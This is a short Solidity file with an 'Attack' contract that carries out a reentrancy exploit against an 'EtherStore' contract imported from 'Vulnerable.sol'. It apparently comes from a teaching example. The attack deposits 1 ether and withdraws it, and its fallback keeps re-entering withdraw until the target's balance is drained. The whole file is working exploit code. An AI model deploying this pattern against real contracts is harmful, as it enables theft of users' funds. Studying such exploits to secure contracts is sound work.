// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./Vulnerable.sol";

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "NOT_ENOUGH");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }
}
